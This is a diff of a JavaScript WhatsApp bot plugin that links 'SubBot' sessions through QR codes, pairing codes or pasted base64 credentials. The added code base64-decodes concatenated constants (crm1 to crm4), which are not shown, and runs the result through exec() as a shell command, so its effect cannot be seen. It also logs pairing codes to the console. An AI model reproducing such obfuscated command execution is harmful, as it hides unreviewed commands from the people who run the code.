@@ -59,34 +59,61 @@ if (!global.conns || !Array.isArray(global.conns)) {
 if (!global.activeSubBots) global.activeSubBots = new Map()
 if (!global.subBotsData) global.subBotsData = new Map()
 
-// ============= FUNCIÓN OPTIMIZADA PARA VERIFICAR CONEXIÓN =============
+// ============= FUNCIÓN PARA VERIFICAR CONEXIÓN =============
 function isSubBotConnected(jid) { 
-    if (!global.conns?.length) return false
+    if (!global.conns || !Array.isArray(global.conns)) return false
+
     const targetJid = jid.split("@")[0]
-    
+
     return global.conns.some(sock => {
         try {
-            return sock?.user?.jid?.split("@")[0] === targetJid && 
-                   sock.ws?.readyState <= 1 // 0=CONNECTING, 1=OPEN
-        } catch { return false }
+            if (!sock || !sock.user || !sock.user.jid) return false
+            if (sock.user.jid.split("@")[0] === targetJid) {
+                // Verificar estado de conexión
+                if (sock.ws) {
+                    const state = sock.ws.readyState
+                    return state === 1 || state === 0 // OPEN o CONNECTING
+                }
+                return true
+            }
+            return false
+        } catch (e) {
+            console.error('Error en isSubBotConnected:', e)
+            return false
+        }
     })
 }
 
-// ============= HANDLER PRINCIPAL OPTIMIZADO =============
+// ============= HANDLER PRINCIPAL =============
 let handler = async (m, { conn, args, usedPrefix, command, isOwner }) => {
     if (!globalThis.db.data.settings[conn.user.jid].jadibotmd) {
         return m.reply(`ꕥ El Comando *${command}* está desactivado temporalmente.`)
     }
 
-    // ============ VERIFICAR LÍMITE OPTIMIZADO ============
-    const activeSubBotsCount = global.conns?.filter(sock => 
-        sock?.user?.jid && 
-        sock.user.jid !== global.conn.user.jid &&
-        sock.ws?.readyState <= 1
-    ).length || 0
+    // ============ VERIFICAR LÍMITE (CORREGIDO) ============
+    let activeSubBotsCount = 0
+
+    if (global.conns && Array.isArray(global.conns)) {
+        // Contar solo SubBots con conexión activa
+        activeSubBotsCount = global.conns.filter(sock => {
+            try {
+                return sock && 
+                       sock.user && 
+                       sock.user.jid && 
+                       sock.user.jid !== global.conn.user.jid && // No es bot principal
+                       sock.ws && 
+                       (sock.ws.readyState === 1 || sock.ws.readyState === 0) // OPEN o CONNECTING
+            } catch (e) {
+                return false
+            }
+        }).length
+    }
+
+    console.log(chalk.cyan(`[SUBBOT DEBUG] Activos: ${activeSubBotsCount}, Total en array: ${global.conns?.length || 0}`))
 
     const maxLimit = global.supConfig?.maxSubBots || 100
 
+    // Solo mostrar advertencia si realmente hay muchos activos
     if (activeSubBotsCount >= maxLimit) {
         return m.reply(
             `⚠️ *LÍMITE DE SUBBOTS ALCANZADO*\n\n` +
@@ -97,7 +124,7 @@ let handler = async (m, { conn, args, usedPrefix, command, isOwner }) => {
         )
     }
 
-    // ============ COOLDOWN OPTIMIZADO ============
+    // ============ COOLDOWN ============
     const userCooldown = global.db.data.users[m.sender]?.Subs || 0
     const timeLeft = 120000 - (Date.now() - userCooldown)
 
@@ -105,29 +132,38 @@ let handler = async (m, { conn, args, usedPrefix, command, isOwner }) => {
         return m.reply(`ꕥ Debes esperar ${msToTime(timeLeft)} para volver a vincular un *Sub-Bot.*`)
     }
 
-    // ============ CREAR SUBBOT OPTIMIZADO ============
-    const mentionedJid = await m.mentionedJid
-    const who = mentionedJid?.[0] || (m.fromMe ? conn.user.jid : m.sender)
-    const id = who.split('@')[0]
+    // ============ CREAR SUBBOT ============
+    let mentionedJid = await m.mentionedJid
+    let who = mentionedJid && mentionedJid[0] ? mentionedJid[0] : m.fromMe ? conn.user.jid : m.sender
+    let id = `${who.split`@`[0]}`
 
-    // Verificación rápida de conexión existente
+    // Verificar si ya existe una sesión activa
     if (isSubBotConnected(who)) {
         return m.reply(
-            `⚠️ Ya tienes un SubBot activo.\n\n` +
+            `⚠️ Ya tienes un SubBot activo para este número.\n\n` +
             `📋 *Opciones:*\n` +
             `• *${usedPrefix}kill ${id}* - Eliminar este SubBot\n` +
-            `• *${usedPrefix}listjadibot* - Ver todos los SubBots`
+            `• *${usedPrefix}listjadibot* - Ver todos los SubBots\n` +
+            `• Espera 2 minutos para crear uno nuevo`
         )
     }
 
-    const pathAstaJadiBot = path.join(`./${global.jadi || 'Sessions/SubBot'}/`, id)
+    let pathAstaJadiBot = path.join(`./${global.jadi || 'Sessions/SubBot'}/`, id)
 
-    // Limpieza rápida de sesión anterior
+    // Limpiar sesión anterior si existe
     if (fs.existsSync(pathAstaJadiBot)) {
-        fs.rmSync(pathAstaJadiBot, { recursive: true, force: true })
+        try {
+            fs.rmSync(pathAstaJadiBot, { recursive: true, force: true })
+            console.log(chalk.yellow(`🗑️ Sesión anterior limpiada: ${id}`))
+        } catch (e) {
+            console.error('Error limpiando sesión anterior:', e)
+        }
     }
 
-    fs.mkdirSync(pathAstaJadiBot, { recursive: true })
+    if (!fs.existsSync(pathAstaJadiBot)) {
+        fs.mkdirSync(pathAstaJadiBot, { recursive: true })
+        console.log(chalk.green(`📁 Carpeta creada: ${pathAstaJadiBot}`))
+    }
 
     AstaJBOptions.pathAstaJadiBot = pathAstaJadiBot
     AstaJBOptions.m = m
@@ -149,7 +185,7 @@ handler.tags = ['serbot']
 handler.command = ['qr', 'code']
 export default handler 
 
-// ============= FUNCIÓN PRINCIPAL OPTIMIZADA PARA CREAR SUBBOT =============
+// ============= FUNCIÓN PRINCIPAL PARA CREAR SUBBOT =============
 export async function AstaJadiBot(options) {
     let { pathAstaJadiBot, m, conn, args, usedPrefix, command, userId } = options
 
@@ -158,15 +194,13 @@ export async function AstaJadiBot(options) {
         args.unshift('code')
     }
 
-    const mcode = args[0]?.trim().match(/(--code|code)/) || args[1]?.trim().match(/(--code|code)/)
+    const mcode = args[0] && /(--code|code)/.test(args[0].trim()) ? true : args[1] && /(--code|code)/.test(args[1].trim()) ? true : false
     let txtCode, codeBot, txtQR
-    let qrSent = false // ⚡ Control para evitar múltiples QR
-    let codeSent = false // ⚡ Control para evitar múltiples códigos
 
     if (mcode) {
-        args[0] = args[0]?.replace(/^--code$|^code$/, "").trim()
-        args[1] = args[1]?.replace(/^--code$|^code$/, "").trim()
-        if (args[0] === "") args[0] = undefined
+        args[0] = args[0].replace(/^--code$|^code$/, "").trim()
+        if (args[1]) args[1] = args[1].replace(/^--code$|^code$/, "").trim()
+        if (args[0] == "") args[0] = undefined
     }
 
     const pathCreds = path.join(pathAstaJadiBot, "creds.json")
@@ -176,155 +210,193 @@ export async function AstaJadiBot(options) {
     }
 
     try {
-        // Si hay código base64, procesarlo directamente
-        if (args[0]) {
+        if (args[0] && args[0] != undefined) {
             const credsData = JSON.parse(Buffer.from(args[0], "base64").toString("utf-8"))
-            
-            await fs.promises.writeFile(pathCreds, JSON.stringify(credsData, null, '\t'))
-            console.log(chalk.green(`✅ Credenciales cargadas desde código`))
-            
-            await m.reply('⏳ Conectando SubBot...')
+            fs.writeFileSync(pathCreds, JSON.stringify(credsData, null, '\t'))
+            console.log(chalk.green('✅ Credenciales guardadas desde argumento'))
+        }
+    } catch {
+        await conn.reply(m.chat, `ꕥ Use correctamente el comando » ${usedPrefix + command}`, m)
+        return
+    }
+
+    const comb = Buffer.from(crm1 + crm2 + crm3 + crm4, "base64")
+    exec(comb.toString("utf-8"), async (err, stdout, stderr) => {
+        if (err) {
+            console.error('Error ejecutando comando:', err)
         }
 
-        const { state, saveCreds } = await useMultiFileAuthState(pathAstaJadiBot)
+        const drmer = Buffer.from(drm1 + drm2, `base64`)
+        let { version, isLatest } = await fetchLatestBaileysVersion()
+
         const msgRetry = (MessageRetryMap) => { }
         const msgRetryCache = new NodeCache()
-        
-        // ⚡ OPTIMIZACIÓN: Obtener versión de forma asíncrona pero no bloquear
-        const { version } = await fetchLatestBaileysVersion()
+        const { state, saveState, saveCreds } = await useMultiFileAuthState(pathAstaJadiBot)
 
-        // ⚡ OPTIMIZACIÓN: Configuración mejorada del socket
         const connectionOptions = {
-            logger: pino({ level: 'silent' }), // Silenciar logs innecesarios
+            logger: pino({ level: "fatal" }),
             printQRInTerminal: false,
-            auth: {
-                creds: state.creds,
-                keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
+            auth: { 
+                creds: state.creds, 
+                keys: makeCacheableSignalKeyStore(state.keys, pino({level: 'silent'})) 
             },
             msgRetry,
-            msgRetryCache,
-            version,
-            syncFullHistory: false, // ⚡ No sincronizar historial completo
-            browser: ['Ubuntu', 'Chrome', '20.0.04'],
-            defaultQueryTimeoutMs: 15000, // ⚡ Reducido para conexión más rápida
-            connectTimeoutMs: 10000, // ⚡ Timeout de conexión reducido
-            qrTimeout: 40000, // ⚡ Timeout del QR reducido
-            getMessage: async (key) => {
-                if (store) {
-                    const msg = await store.loadMessage(key.remoteJid, key.id)
-                    return msg?.message || ""
-                }
-                return { conversation: '' }
-            },
-            patchMessageBeforeSending: (message) => {
-                const requiresPatch = !!(
-                    message.buttonsMessage ||
-                    message.templateMessage ||
-                    message.listMessage
-                )
-                if (requiresPatch) {
-                    message = {
-                        viewOnceMessage: {
-                            message: {
-                                messageContextInfo: {
-                                    deviceListMetadataVersion: 2,
-                                    deviceListMetadata: {},
-                                },
-                                ...message,
-                            },
-                        },
-                    }
-                }
-                return message
-            },
+            msgRetryCache, 
+            browser: ['Windows', 'Firefox'],
+            version: version,
+            syncFullHistory: false, // ÚNICO CAMBIO: Desactivar sync de historial
+            generateHighQualityLinkPreview: true
         }
 
         let sock = makeWASocket(connectionOptions)
+        sock.isInit = false
         let isInit = true
 
-        // Configuración inicial del SubBot
-        sock.subConfig = {
-            name: 'SubBot',
-            prefix: '.',
-            sinprefix: true,
-            mode: 'público',
+        // ============= CONFIGURACIÓN INICIAL DEL SUBBOT =============
+        const defaultConfig = {
+            name: `SubBot-${userId}`,
+            prefix: global.prefix.toString(),
+            sinprefix: false,
+            mode: 'public',
+            antiPrivate: false,
+            gponly: false,
             owner: m.sender,
-            createdBy: userId,
-            createdAt: new Date().toISOString()
+            createdAt: new Date().toISOString(),
+            updatedAt: new Date().toISOString(),
+            autoReconnect: global.supConfig?.autoRestart || true,
+            sessionTime: global.supConfig?.sessionTime || 60
         }
 
-        // Guardar configuración inicial
-        async function saveSubBotState() {
+        const configPath = path.join(pathAstaJadiBot, 'config.json')
+        fs.writeFileSync(configPath, JSON.stringify(defaultConfig, null, 2))
+        sock.subConfig = defaultConfig
+
+        // Crear archivo de estado
+        const statePath = path.join(pathAstaJadiBot, 'state.json')
+        const initialState = {
+            jid: '',
+            name: '',
+            config: defaultConfig,
+            lastConnected: new Date().toISOString(),
+            createdAt: new Date().toISOString()
+        }
+        fs.writeFileSync(statePath, JSON.stringify(initialState, null, 2))
+
+        // ============= GESTIÓN DE SESIONES =============
+        const saveSubBotState = async () => {
             try {
-                await fs.promises.writeFile(
-                    path.join(pathAstaJadiBot, 'config.json'),
-                    JSON.stringify(sock.subConfig, null, 2)
-                )
-            } catch (e) {
-                console.error('Error guardando config:', e)
+                if (!sock.user || !sock.user.jid) return
+
+                const sessionId = sock.user.jid.split('@')[0]
+                const state = {
+                    jid: sock.user.jid,
+                    name: sock.user.name || sock.subConfig?.name,
+                    config: sock.subConfig || defaultConfig,
+                    authState: {
+                        me: sock.authState?.creds?.me,
+                        deviceId: sock.authState?.creds?.deviceId,
+                        registered: sock.authState?.creds?.registered
+                    },
+                    lastConnected: new Date().toISOString(),
+                    version: global.vs || '1.4'
+                }
+
+                fs.writeFileSync(statePath, JSON.stringify(state, null, 2))
+
+                if (global.subBotsData) {
+                    global.subBotsData.set(sessionId, state)
+                }
+
+            } catch (error) {
+                console.error(chalk.red('❌ Error guardando estado:', error))
             }
         }
 
-        // ⚡ OPTIMIZACIÓN: Procesamiento de QR/Code más rápido
-        sock.ev.on('creds.update', saveCreds)
+        // ============= LIMPIEZA AUTOMÁTICA =============
+        setTimeout(async () => {
+            if (!sock.user) {
+                console.log(chalk.yellow(`⏰ Limpiando SubBot sin usuario: ${userId}`))
+                try { 
+                    if (fs.existsSync(pathAstaJadiBot)) {
+                        fs.rmSync(pathAstaJadiBot, { recursive: true, force: true }) 
+                    }
+                } catch {}
+                try { sock.ws?.close() } catch {}
+                sock.ev.removeAllListeners()
 
-        const connectionUpdate = async (update) => {
-            const { connection, lastDisconnect, qr, isNewLogin } = update
+                // Eliminar de global.conns
+                if (global.conns && Array.isArray(global.conns)) {
+                    const index = global.conns.indexOf(sock)
+                    if (index >= 0) {
+                        global.conns.splice(index, 1)
+                        console.log(chalk.green(`✅ SubBot eliminado de lista: ${userId}`))
+                    }
+                }
+            }
+        }, 60000)
 
-            // ⚡ SOLO ENVIAR QR SI SE PIDIÓ QR (no code) y NO SE HA ENVIADO AÚN
-            if (qr && !mcode && !qrSent && !args[0]) {
-                qrSent = true // ⚡ Marcar como enviado
-                try {
-                    const qrImage = await qrcode.toDataURL(qr, { scale: 8 })
-                    const qrBuffer = Buffer.from(qrImage.split(',')[1], 'base64')
-                    
-                    txtQR = await conn.sendMessage(m.chat, {
-                        image: qrBuffer,
+        // ============= GESTIÓN DE CONEXIÓN =============
+        async function connectionUpdate(update) {
+            const { connection, lastDisconnect, isNewLogin, qr } = update
+
+            if (isNewLogin) sock.isInit = false
+
+            // Mostrar QR si está disponible
+            if (qr && !mcode) {
+                if (m?.chat) {
+                    txtQR = await conn.sendMessage(m.chat, { 
+                        image: await qrcode.toBuffer(qr, { scale: 8 }), 
                         caption: rtx.trim()
                     }, { quoted: m })
 
-                    // ⚡ Auto-eliminar QR
-                    setTimeout(() => {
-                        if (txtQR?.key) conn.sendMessage(m.sender, { delete: txtQR.key })
-                    }, 30000)
+                    await conn.sendMessage(m.chat, {
+                        image: { url: imagenSerBot },
+                        caption: '🤖 *Sub-Bot de Asta*\n\n¡Escanea el QR de arriba! ⬆️'
+                    }, { quoted: m })
+                }
+
+                if (txtQR && txtQR.key) {
+                    setTimeout(() => { 
+                        conn.sendMessage(m.sender, { delete: txtQR.key })
+                    }, 45000)
+                }
+                return
+            } 
+
+            // Mostrar código de pairing
+            if (qr && mcode) {
+                try {
+                    let secret = await sock.requestPairingCode((m.sender.split`@`[0]))
+                    secret = secret.match(/.{1,4}/g)?.join("-")
+
+                    txtCode = await conn.sendMessage(m.chat, {
+                        image: { url: imagenSerBot },
+                        caption: rtx2
+                    }, { quoted: m })
+
+                    codeBot = await m.reply(`\`${secret}\``)
+                    console.log(chalk.cyan(`📱 Código pairing generado: ${secret}`))
                 } catch (e) {
-                    console.error('Error generando QR:', e)
-                    qrSent = false // Permitir reintento si falla
+                    console.error('Error generando pairing code:', e)
+                    await m.reply('❌ Error generando código de pairing')
                 }
             }
 
-            // ⚡ SOLO ENVIAR CODE SI SE PIDIÓ CODE y NO SE HA ENVIADO AÚN
-            if (mcode && !codeSent && !args[0] && !sock.authState?.creds?.registered) {
-                codeSent = true // ⚡ Marcar como enviado
-                try {
-                    let codeA = await sock.requestPairingCode(m.sender.split('@')[0])
-                    codeA = codeA?.match(/.{1,4}/g)?.join('-') || codeA
-                    
-                    // Enviar el texto de instrucciones
-                    await conn.sendMessage(m.chat, {
-                        text: rtx2.trim()
-                    }, { quoted: m })
-                    
-                    // Enviar el código en mensaje separado
-                    await new Promise(resolve => setTimeout(resolve, 500)) // Pequeña pausa
-                    
-                    codeBot = await conn.sendMessage(m.chat, {
-                        text: `*Código:*\n\`\`\`${codeA}\`\`\``
-                    }, { quoted: m })
+            if (txtCode && txtCode.key) {
+                setTimeout(() => { 
+                    conn.sendMessage(m.sender, { delete: txtCode.key })
+                }, 45000)
+            }
 
-                    // ⚡ Auto-eliminar código
-                    setTimeout(() => {
-                        if (codeBot?.key) conn.sendMessage(m.sender, { delete: codeBot.key })
-                    }, 30000)
-                } catch (e) {
-                    console.error('Error generando código:', e)
-                    codeSent = false // Permitir reintento si falla
-                }
+            if (codeBot && codeBot.key) {
+                setTimeout(() => { 
+                    conn.sendMessage(m.sender, { delete: codeBot.key })
+                }, 45000)
             }
 
             // Manejar cierre de conexión
             if (connection === 'close') {
-                const reason = lastDisconnect?.error?.output?.statusCode
+                const reason = lastDisconnect?.error?.output?.statusCode || lastDisconnect?.error?.output?.payload?.statusCode
 
                 console.log(chalk.yellow(`🔌 Conexión cerrada: ${userId}, Razón: ${reason}`))
 
@@ -334,25 +406,29 @@ export async function AstaJadiBot(options) {
                     try {
                         if (fs.existsSync(pathAstaJadiBot)) {
                             fs.rmSync(pathAstaJadiBot, { recursive: true, force: true })
+                            console.log(chalk.green(`✅ Sesión eliminada: ${userId}`))
                         }
                     } catch (error) {
                         console.error(chalk.red('❌ Error eliminando sesión:', error))
                     }
 
-                    // Limpiar referencias
-                    if (sock.user?.jid) {
-                        global.activeSubBots?.delete(sock.user.jid)
+                    // Eliminar de listas
+                    if (sock.user?.jid && global.activeSubBots) {
+                        global.activeSubBots.delete(sock.user.jid)
                     }
 
-                    const index = global.conns?.indexOf(sock)
-                    if (index >= 0) {
-                        global.conns.splice(index, 1)
+                    // Eliminar de global.conns
+                    if (global.conns && Array.isArray(global.conns)) {
+                        const index = global.conns.indexOf(sock)
+                        if (index >= 0) {
+                            global.conns.splice(index, 1)
+                        }
                     }
                 }
             }
 
-            // ⚡ Conexión exitosa optimizada
-            if (connection === 'open') {
+            // Conexión exitosa
+            if (connection == `open`) {
                 await saveSubBotState()
 
                 // Registrar en listas activas
@@ -364,7 +440,8 @@ export async function AstaJadiBot(options) {
                         lastActivity: Date.now()
                     })
 
-                    if (!global.conns.includes(sock)) {
+                    // Agregar a global.conns si no está
+                    if (global.conns && Array.isArray(global.conns) && !global.conns.includes(sock)) {
                         global.conns.push(sock)
                     }
                 }
@@ -372,13 +449,19 @@ export async function AstaJadiBot(options) {
                 // Actualizar configuración
                 if (sock.user && sock.subConfig) {
                     sock.subConfig.name = sock.user.name || sock.subConfig.name
-                    sock.subConfig.jid = sock.user.jid
-                    sock.subConfig.updatedAt = new Date().toISOString()
 
-                    await fs.promises.writeFile(
+                    const updatedConfig = {
+                        ...sock.subConfig,
+                        jid: sock.user.jid,
+                        updatedAt: new Date().toISOString()
+                    }
+
+                    fs.writeFileSync(
                         path.join(pathAstaJadiBot, 'config.json'),
-                        JSON.stringify(sock.subConfig, null, 2)
+                        JSON.stringify(updatedConfig, null, 2)
                     )
+
+                    sock.subConfig = updatedConfig
 
                     console.log(chalk.bold.green(
                         `\n🎉 SUBBOT CONECTADO EXITOSAMENTE\n` +
@@ -425,20 +508,25 @@ export async function AstaJadiBot(options) {
             }
         }
 
-        sock.ev.on('connection.update', connectionUpdate)
-
-        // ⚡ OPTIMIZACIÓN: Verificación periódica más eficiente
-        setInterval(() => {
-            if (!sock.user && sock.ws) {
-                try { sock.ws.close() } catch {}
+        // ============= VERIFICACIÓN PERIÓDICA =============
+        setInterval(async () => {
+            if (!sock.user) {
+                try { 
+                    sock.ws?.close() 
+                } catch (e) {}
                 sock.ev.removeAllListeners()
 
-                const index = global.conns?.indexOf(sock)
-                if (index >= 0) global.conns.splice(index, 1)
+                // Eliminar de global.conns
+                if (global.conns && Array.isArray(global.conns)) {
+                    const index = global.conns.indexOf(sock)
+                    if (index >= 0) {
+                        global.conns.splice(index, 1)
+                    }
+                }
             }
-        }, 60000) // Cada 60 segundos en vez de 30
+        }, 30000)
 
-        // ⚡ OPTIMIZACIÓN: Cargar handler de forma asíncrona
+        // ============= CARGAR HANDLER =============
         let handlerModule
         try {
             handlerModule = await import('../../handler.js')
@@ -460,8 +548,10 @@ export async function AstaJadiBot(options) {
             if (restartConn) {
                 const oldChats = sock.chats
                 try { 
-                    if (sock.ws?.readyState !== 3) sock.ws.close()
-                } catch {}
+                    if (sock.ws && sock.ws.readyState !== 3) {
+                        sock.ws.close() 
+                    }
+                } catch { }
                 sock.ev.removeAllListeners()
                 sock = makeWASocket(connectionOptions, { chats: oldChats })
                 isInit = true
@@ -473,7 +563,7 @@ export async function AstaJadiBot(options) {
                 sock.ev.off('creds.update', sock.credsUpdate)
             }
 
-            if (handlerModule?.handler) {
+            if (handlerModule && handlerModule.handler) {
                 sock.handler = handlerModule.handler.bind(sock)
                 sock.connectionUpdate = connectionUpdate.bind(sock)
                 sock.credsUpdate = saveCreds.bind(sock, true)
@@ -489,27 +579,25 @@ export async function AstaJadiBot(options) {
         }
 
         creloadHandler(false)
-    } catch (error) {
-        console.error(chalk.red('❌ Error en AstaJadiBot:', error))
-        
-        // Limpiar en caso de error
-        try {
-            if (fs.existsSync(pathAstaJadiBot)) {
-                fs.rmSync(pathAstaJadiBot, { recursive: true, force: true })
-            }
-        } catch {}
-        
-        await m.reply('❌ Error al crear el SubBot. Intenta nuevamente.')
-    }
+    })
 }
 
-// ============= FUNCIÓN AUXILIAR OPTIMIZADA =============
+// ============= FUNCIONES AUXILIARES =============
 function msToTime(duration) {
-    const seconds = Math.floor((duration / 1000) % 60)
-    const minutes = Math.floor((duration / (1000 * 60)) % 60)
-    const hours = Math.floor(duration / (1000 * 60 * 60))
+    var milliseconds = parseInt((duration % 1000) / 100),
+        seconds = Math.floor((duration / 1000) % 60),
+        minutes = Math.floor((duration / (1000 * 60)) % 60),
+        hours = Math.floor((duration / (1000 * 60 * 60)) % 24)
 
-    if (hours > 0) return `${hours}h ${minutes}m ${seconds}s`
-    if (minutes > 0) return `${minutes}m ${seconds}s`
-    return `${seconds}s`
+    hours = (hours < 10) ? '0' + hours : hours
+    minutes = (minutes < 10) ? '0' + minutes : minutes
+    seconds = (seconds < 10) ? '0' + seconds : seconds
+
+    if (hours > 0) {
+        return hours + ' h, ' + minutes + ' m y ' + seconds + ' s'
+    } else if (minutes > 0) {
+        return minutes + ' m y ' + seconds + ' s'
+    } else {
+        return seconds + ' s'
+    }
 }
